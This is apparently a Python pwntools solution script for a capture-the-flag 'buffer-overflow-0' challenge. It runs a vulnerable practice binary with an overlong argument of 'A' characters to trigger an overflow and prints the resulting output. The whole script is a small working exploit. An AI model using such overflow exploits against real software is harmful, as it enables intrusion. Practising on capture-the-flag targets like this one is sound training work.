from pwn import *

LOCAL = True

if(LOCAL):
    bin = './vuln'
else:
    bin = '/problems/buffer-overflow-0_1_316c391426b9319fbdfb523ee15b37db'

args = " AAAAAAAAAAAAAAAAAAAAAAAA"
p = process([bin,args],stderr = STDOUT)
print(p.recvall().decode())
print(p.recvline())
#elf = ELF(bin)
#print(p.recvline().decode())
